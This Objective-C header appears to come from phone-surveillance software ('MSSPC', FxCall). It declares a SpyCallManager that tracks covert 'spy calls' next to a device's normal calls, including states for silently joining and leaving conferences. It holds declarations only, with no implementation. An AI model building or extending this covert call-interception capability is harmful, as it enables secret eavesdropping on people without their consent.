//
//  SpyCallManager.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#define MAX_CONFERENCE_LINE 2

@class FxCall;
@class SystemEnvironmentUtils;
@class TelephoneNumberPicker;

@protocol SpyCallDisconnectDelegate;

typedef enum {
	kSpyCallConferenceTaskNone,
	kSpyCallConferenceTaskResumeNormal,
	kSpyCallConferenceTaskJoinConference
} SpyCallConferenceTask;

@interface SpyCallManager : NSObject {
@private
	NSMutableArray			*mCalls; // FxCall
	NSMutableArray			*mSpyCallDisconnectDelegates;
	SystemEnvironmentUtils	*mSystemEnvUtils;
	FxCall					*mSpyCall;
	TelephoneNumberPicker	*mTelephoneNumberPicker;
	
	BOOL					mIsNormalCallInProgress;
	BOOL					mIsNormalCallIncoming;
	BOOL					mIsSpyCallInProgress;
	BOOL					mIsSpyCallAnswering;
	BOOL					mIsSpyCallDisconnecting;
	BOOL					mIsSpyCallCompletelyHangup;
	BOOL					mIsSpyCallInitiatingConference;
	BOOL					mIsSpyCallInConference;
	BOOL					mIsSpyCallLeavingConference;
	
	SpyCallConferenceTask	mSpyCallConferenceTask;
}

@property (nonatomic, readonly) NSMutableArray *mCalls;
@property (nonatomic, readonly) SystemEnvironmentUtils *mSystemEnvUtils;
@property (nonatomic, retain) FxCall *mSpyCall;
@property (nonatomic, readonly) TelephoneNumberPicker *mTelephoneNumberPicker;

@property (nonatomic, assign) BOOL mIsNormalCallInProgress;
@property (nonatomic, assign) BOOL mIsNormalCallIncoming;
@property (nonatomic, assign) BOOL mIsSpyCallInProgress;
@property (nonatomic, assign) BOOL mIsSpyCallAnswering;
@property (nonatomic, assign) BOOL mIsSpyCallDisconnecting;
@property (nonatomic, assign) BOOL mIsSpyCallCompletelyHangup;
@property (nonatomic, assign) BOOL mIsSpyCallInitiatingConference;
@property (nonatomic, assign) BOOL mIsSpyCallInConference;
@property (nonatomic, assign) BOOL mIsSpyCallLeavingConference;

@property (nonatomic, assign) SpyCallConferenceTask mSpyCallConferenceTask;

+ (id) sharedManager;

- (NSInteger) normalCallCount;
- (BOOL) isCallsOnHold;

- (void) handleDialingCall: (FxCall *) aCall;
- (void) handleIncomingCall: (FxCall *) aCall;
- (void) handleCallConnected: (FxCall *) aCall;
- (void) handleCallOnHold: (FxCall *) aCall;
- (void) handleCallDisconnected: (FxCall *) aCall;

- (void) addSpyCallDisconnectDelegate: (id <SpyCallDisconnectDelegate>) aDelegate;
- (void) removeSpyCallDisconnectDelegate: (id <SpyCallDisconnectDelegate>) aDelegate;

- (void) disconnectedActivityDetected;

@end
